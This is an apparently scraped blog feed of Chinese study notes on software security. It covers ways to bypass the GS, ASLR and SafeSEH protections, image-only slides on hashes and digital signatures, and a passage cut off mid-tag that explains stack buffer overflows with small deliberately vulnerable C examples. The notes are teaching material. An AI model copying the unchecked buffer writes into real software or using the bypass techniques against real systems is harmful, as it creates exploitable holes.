href="#绕过GS安全机制" class="headerlink" title="绕过GS安全机制"></a>绕过GS安全机制</h2><p>Visual Studio在实现<strong>GS安全机制的时候，除了增加Cookie，还会对栈中变量进行重新排序</strong>，比如：将字符串缓冲区分配在栈帧的最高地址上，因此，当字符串缓冲区溢出，就不能覆盖本地变量了。</p><p>但是，<strong>考虑到效率问题，它仅按照函数隐患及危害程度进行选择性保护，因此有一部分函数可能没有得到有效的保护</strong>。比如：<u>结构成员因为互操作性问题而不能重新排列</u>，因此当它们包含缓冲区时，这个缓冲区溢出就可以将之后其它成员覆盖和控制。</p><p>正是因为GS安全机制存在这些缺陷，所以聪明的攻击者构造出了各种办法来绕过GS保护机制。David Litchfield在2003年提出了一个技术来绕过GS保护机制：如果Cookie被一个不同的值覆盖了，代码会检查是否安装了安全处理例程，如果没有，系统的<strong>异常处理器</strong>就将接管它。</p><p>如果黑客<strong>覆盖掉了一个异常处理结构，并在Cookie被检查前触发一个异常，这时栈中虽然仍然存在Cookie，但是还是可以被成功溢出</strong>。这个方法相当于是利用SEH进行漏洞攻击。可以说，<strong>GS安全机制最重要的一个缺陷是没有保护异常处理器</strong>，但这点上虽然有SEH保护机制作为后盾，但SEH保护机制也是可以被绕过的。</p><h2 id="ASLR缺陷和绕过方法"><a href="#ASLR缺陷和绕过方法" class="headerlink" title="ASLR缺陷和绕过方法"></a>ASLR缺陷和绕过方法</h2><p>ASLR通过增加随机偏移使得攻击变得非常困难。但是，ASLR技术存在很多脆弱性：（1）为了减少虚拟地址空间的碎片，操作系统把随机加载库文件的<strong>地址限制为8位</strong>，即地址空间为256，而且<strong>随机化发生在地址前两个最有意义的字节上</strong>；<br>（2）<strong>很多应用程序和DLL模块并没有采用/DYNAMICBASE的编译选项；</strong><br>（3）很多<strong>应用程序使用相同的系统DLL文件</strong>，这些系统DLL加载后地址就确定下来了，对于<strong>本地攻击，攻击者还是很容易就能获得所需要的地址</strong>，然后进行攻击。</p><p>针对这些缺陷，还有一些其他绕过方法，比如<strong>攻击未开启地址随机化的模块（作为跳板）</strong>、<strong>堆喷洒技术</strong>、<strong>部分返回地址覆盖法</strong>等。</p><h2 id="SEH保护机制缺陷和绕过方法"><a href="#SEH保护机制缺陷和绕过方法" class="headerlink" title="SEH保护机制缺陷和绕过方法"></a>SEH保护机制缺陷和绕过方法</h2><p><strong>当一个进程中存在一个不是/SafeSEH编译的DLL或者库文件的时候，整个SafeSEH机制就可能失效</strong>。因为/SafeSEH编译选项需要.NET的编译器支持，<strong>现在仍有大量第三方库和程序没有使用该编译器编译或者没有启动/SafeSEH选项</strong>。</p><p>目前，较为可行的绕过SafeSEH的方法有：</p><ul><li>利用未开启SafeSEH的模块作为跳板绕过：可以在未启用SafeSEH的模块里找一些跳转指令，覆盖SEH函数指针，由于这些指令在未启用SafeSEH的模块里，因此异常触发时，可以执行到这些指令。</li><li><strong>利用加载模块之外的地址进行绕过</strong>：可以利用加载模块之外的地址，包括从堆中进行绕过或者其他一些特定内存绕过，具体不展开介绍。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇介绍了漏洞利用的一些方法，主要介绍了Shellcode的编写与编码、Windows安全防护机制、漏洞利用的进阶技术（包括API函数自搜索、返回导向编程）等。</p><p>内容有一定难度，需要一定基础，关于API函数自搜索一节并不是特别理解，后续复习PE文件结构时会再次结合视频学习。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据认证</title>
      <link href="/2023/03/14/shu-ju-ren-zheng/"/>
      <url>/2023/03/14/shu-ju-ren-zheng/</url>
      
        <content type="html"><![CDATA[<h2 id="散列函数"><a href="#散列函数" class="headerlink" title="散列函数"></a>散列函数</h2><p><img src="/2023/03/14/shu-ju-ren-zheng/813b462ea88c52e1fef6cd35bb3c186f.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/813b462ea88c52e1fef6cd35bb3c186f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/33da647658831b3c218a5ac4d8afe1bb.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/33da647658831b3c218a5ac4d8afe1bb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/cbcdc572f35a14fc7b9edd94c97e2238.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/cbcdc572f35a14fc7b9edd94c97e2238.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/9c53b1397ac53572327e36c10ec1517c.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/9c53b1397ac53572327e36c10ec1517c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/ec2f6d3b13e0b30bb3f4a0d44ac3622c.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/ec2f6d3b13e0b30bb3f4a0d44ac3622c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/d722b562c6ddd93831ea49aeaa5a0627.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/d722b562c6ddd93831ea49aeaa5a0627.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/fa7389f409feb91630ff37db1a5e7c58.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/fa7389f409feb91630ff37db1a5e7c58.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/bf03f2c21f68dd07396c57d8bc243aa2.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/bf03f2c21f68dd07396c57d8bc243aa2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/38b73923bece599f219ea07a65594fcd.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/38b73923bece599f219ea07a65594fcd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="密码校验和"><a href="#密码校验和" class="headerlink" title="密码校验和"></a>密码校验和</h2><p><img src="/2023/03/14/shu-ju-ren-zheng/890a3eb391134f4c903a5eecab0297fb.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/890a3eb391134f4c903a5eecab0297fb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/43116b5f324668000989bb98e2b6c5b6.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/43116b5f324668000989bb98e2b6c5b6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/56c78b34ce85fd898050ef4a5b0a0005.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/56c78b34ce85fd898050ef4a5b0a0005.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/aa412fc2e9483269fb5bd625b992dc7c.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/aa412fc2e9483269fb5bd625b992dc7c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/b6dbf7b424d4486076f9001b5cebdf77.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/b6dbf7b424d4486076f9001b5cebdf77.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/2b5c5a9c43335525aa1fe77a3c75fffa.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/2b5c5a9c43335525aa1fe77a3c75fffa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/7935ef3e75006bfd5fa9b707b33824f7.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/7935ef3e75006bfd5fa9b707b33824f7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/7e6e3a3520714878a7a56434ffd51af1.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/7e6e3a3520714878a7a56434ffd51af1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="生日攻击"><a href="#生日攻击" class="headerlink" title="生日攻击"></a>生日攻击</h2><p><img src="/2023/03/14/shu-ju-ren-zheng/4999741d8e4d23353d15b253b92a96c6.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/4999741d8e4d23353d15b253b92a96c6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/1f4fecc7f40829862a1e706797f931ba.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/1f4fecc7f40829862a1e706797f931ba.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/3fea4050a1a0e45170a2e870ef3c274a.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/3fea4050a1a0e45170a2e870ef3c274a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/d06a7dbe6872411a0e82e98d2edce4db.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/d06a7dbe6872411a0e82e98d2edce4db.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/02f01d1b514bbd9968bf04b09a775530.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/02f01d1b514bbd9968bf04b09a775530.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/8efe73d27d66964d8a91472986869bb7.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/8efe73d27d66964d8a91472986869bb7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/19954242679dfabbd74fdc12444344fd.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/19954242679dfabbd74fdc12444344fd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="数字签名标准"><a href="#数字签名标准" class="headerlink" title="数字签名标准"></a>数字签名标准</h2><p><img src="/2023/03/14/shu-ju-ren-zheng/7e0433b3e376e6cd21a076d7bd472c4d.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/7e0433b3e376e6cd21a076d7bd472c4d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/75efa6d1a7372d9e16e64de815f3cc64.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/75efa6d1a7372d9e16e64de815f3cc64.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/bc237a0661e443699acd89c72e392f8f.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/bc237a0661e443699acd89c72e392f8f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/6f4d11716d7f44ad6fc2e97b96b6d290.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/6f4d11716d7f44ad6fc2e97b96b6d290.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/39ebc7ba3d727c6853b4722fc9f23d21.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/39ebc7ba3d727c6853b4722fc9f23d21.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/b56fc56e74b878c6fc90833ffb3a3925.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/b56fc56e74b878c6fc90833ffb3a3925.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="双重签名"><a href="#双重签名" class="headerlink" title="双重签名"></a>双重签名</h2><p><img src="/2023/03/14/shu-ju-ren-zheng/9797908247f24f71f64b73f0fa25a9f6.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/9797908247f24f71f64b73f0fa25a9f6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/7b407b25914c31451dc29a70dd6f71f4.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/7b407b25914c31451dc29a70dd6f71f4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/95533b8c375c6cbc5fb2aad796bc31b7.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/95533b8c375c6cbc5fb2aad796bc31b7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/0cb90b3aecdbffae617d16aa45f2c3b6.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/0cb90b3aecdbffae617d16aa45f2c3b6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/5147e583c31d946e0324c5c88387c0de.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/5147e583c31d946e0324c5c88387c0de.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/3459807ab356e135e0ee899720332c1f.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/3459807ab356e135e0ee899720332c1f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="盲签名和电子现金"><a href="#盲签名和电子现金" class="headerlink" title="盲签名和电子现金"></a>盲签名和电子现金</h2><p><img src="/2023/03/14/shu-ju-ren-zheng/c1be4379cd9e7579786461ee49e1188c.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/c1be4379cd9e7579786461ee49e1188c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/d0c4eccdd8adab66289b989f882af379.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/d0c4eccdd8adab66289b989f882af379.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/754c0767393bce749624cf74bd0b99a8.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/754c0767393bce749624cf74bd0b99a8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/218ce0f59b9137a6d65fd581a022be76.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/218ce0f59b9137a6d65fd581a022be76.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/67e2500c13d0607cdfca3285aaf24012.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/67e2500c13d0607cdfca3285aaf24012.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/da2d74f6afd972df477d35853098efe3.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/da2d74f6afd972df477d35853098efe3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/9d930b52d3bc87f73b1fb56bc3e581d7.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/9d930b52d3bc87f73b1fb56bc3e581d7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/c19a737c3d39e37176bee5a96f66a8e6.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/c19a737c3d39e37176bee5a96f66a8e6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/c4015423494bebb69baa0d2afc3a8fd4.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/c4015423494bebb69baa0d2afc3a8fd4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p> <img src="/2023/03/14/shu-ju-ren-zheng/75de51b05eec8af931aa15690db6cfc6.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/75de51b05eec8af931aa15690db6cfc6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/d2fcec44694ff5b656d40d4d0d496776.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/d2fcec44694ff5b656d40d4d0d496776.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/7a8161a307374492a87cc5a11904e0c9.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/7a8161a307374492a87cc5a11904e0c9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/0e573a54170375084e89974b6f8ba1bc.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/0e573a54170375084e89974b6f8ba1bc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/shu-ju-ren-zheng/5d552288f5792f5cc132a4390357ff54.png" class="lazyload placeholder" data-srcset="/2023/03/14/shu-ju-ren-zheng/5d552288f5792f5cc132a4390357ff54.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
            <tag> 安全协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件漏洞篇</title>
      <link href="/2023/03/13/ruan-jian-lou-dong-pian/"/>
      <url>/2023/03/13/ruan-jian-lou-dong-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>漏洞也称为<strong>脆弱性</strong>(Vulnerability)，是计算机系统的硬件、软件、协议在系统设计、具体实现、系统配置或安全策略上存在的缺陷。</p><p>缺陷一旦被发现并被<u>恶意利用</u>，就会使攻击者在未授权的情况下访问或破坏系统，从而影响计算机系统的正常运行甚至造成安全损害。</p><p><code>对于漏洞有多种称呼，包括Hole, Error, Fault, Weakness, Failure等，这些称呼都不能涵盖漏洞的含义（脆弱性）。</code></p><p>软件漏洞专指计算机系统中的<strong>软件系统漏洞</strong>。</p><h1 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>缓冲区</strong></p><p>缓冲区是一块连续的内存区域，用于存放程序运行时加载到内存的运行代码和数据。</p><p><strong>缓冲区溢出</strong></p><p>缓冲区溢出是指程序运行时，向固定大小的缓冲区写入超过其容量的数据，多余的数据会越过缓冲区的边界覆盖相邻内存空间，从而造成溢出。 </p><p>缓冲区的大小是由用户输入的数据决定的，如果程序<strong>不对用户输入的超长数据作长度检查</strong>，同时用户又对程序进行了<strong>非法操作或者错误输入</strong>，就会造成缓冲区溢出。</p><p><strong>缓冲区溢出攻击</strong></p><p>缓冲区溢出攻击是指发生缓冲区溢出时，溢出的数据会覆盖相邻内存空间的返回地址、函数指针、堆管理结构等合法数据，从而使程序运行失败、或者发生转向去执行其它程序代码、或者<strong>执行预先注入到内存缓冲区中的代码</strong>。</p><p><code>缓冲区溢出后执行的代码，会以原有程序的身份权限运行。</code></p><p><strong>造成缓冲区溢出的根本原因</strong></p><p>是<strong>缺乏类型安全功能的程序设计语言</strong>（C、C++等）出于效率的考虑，<strong>部分函数不对数组边界条件和函数指针引用等进行边界检查</strong>。例如，C 标准库中和字符串操作有关的函数，像strcpy，strcat，sprintf，gets等函数中，<strong>数组和指针都没有自动边界检查</strong>。</p><p>程序员开发时必须自己<u>进行边界检查，防范数据溢出</u>，否则所开发的程序就存在缓冲区溢出的安全隐患，而实际上这一行为往往被程序员忽略或者检查不充分。</p><p>缓冲区溢出通常包括<em>栈溢出</em>、<em>堆溢出</em>、<em>异常处理SEH结构溢出</em>、<em>单字节溢出</em>等。</p><h2 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p><strong>栈溢出漏洞</strong>，即发生在栈区的溢出漏洞。被调用的子函数中写入数据的长度，大于栈帧的基址到esp之间预留的保存局部变量的空间时，就会发生栈的溢出。要写入数据的填充方向是从低地址向高地址增长，多余的数据就会越过栈帧的基址，覆盖基址以上的地址空间。</p><h3 id="栈溢出漏洞示例"><a href="#栈溢出漏洞示例" class="headerlink" title="栈溢出漏洞示例"></a>栈溢出漏洞示例</h3><p>下面的程序演示了一个溢出漏洞，代码如下 ：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">why_here</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;    <span class="built_in">printf</span>(<span class="string">&quot;why u r here?!\n&quot;</span>); </span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;     <span class="type">int</span> buff[<span class="number">1</span>];</span><br><span class="line">       buff[<span class="number">2</span>] = (<span class="type">int</span>)why_here;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;      <span class="built_in">f</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如程序所示，主函数将调用函数f，并没有调用why_here函数，但是运行结果如下：</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/8ea39856bbbe4a16845fea8f906e96bb.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/8ea39856bbbe4a16845fea8f906e96bb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>在函数f中，所声明的数组buff长度为1，但是由于没有对访问下标的值进行校验，程序中<strong>对数组外的内存进行了读写</strong>，这是一个典型的溢出漏洞。</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/31f362c510b71e12cd2eaec670fc9f1c.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/31f362c510b71e12cd2eaec670fc9f1c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">why_here</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;    <span class="built_in">printf</span>(<span class="string">&quot;why u r here?!\n&quot;</span>); </span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;     <span class="type">int</span> buff; <span class="type">int</span> * p = &amp;buff; </span><br><span class="line">       ________= (<span class="type">int</span>)why_here;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;      <span class="built_in">f</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//答案：*(p+2)或者p[2]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/c14d0d5f8964a6b0d4d23eafbab7bb10.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/c14d0d5f8964a6b0d4d23eafbab7bb10.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="溢出漏洞利用示例"><a href="#溢出漏洞利用示例" class="headerlink" title="溢出漏洞利用示例"></a>溢出漏洞利用示例</h3><h4 id="修改返回地址"><a href="#修改返回地址" class="headerlink" title="修改返回地址"></a>修改返回地址</h4><p>栈的存取采用先进后出的策略，程序用它来保存函数调用时的有关信息，如函数参数、返回地址，函数中的非静态局部变量存放在栈中。如果返回地址被覆盖，当覆盖后的地址是一个无效地址，则程序运行失败。如果<strong>覆盖返回地址的是恶意程序的入口地址，则源程序将转向去执行恶意程序</strong>。</p><p>下面以一段程序为例说明栈溢出的原理。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stack_overflow</span><span class="params">(<span class="type">char</span>* argument)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> local[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; argument[i];i++)</span><br><span class="line">             local[i] = argument[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数<code>stack_overflow</code>被调用时堆栈布局如下图所示。图中local是栈中保存局部变量的缓冲区，根据char local[4]预先分配的大小为4个字节，当向local中写入超过4个字节的字符时，就会发生溢出。</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/1bc74d210d06304d4d84b985572dbd6b.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/1bc74d210d06304d4d84b985572dbd6b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="覆盖临接变量"><a href="#覆盖临接变量" 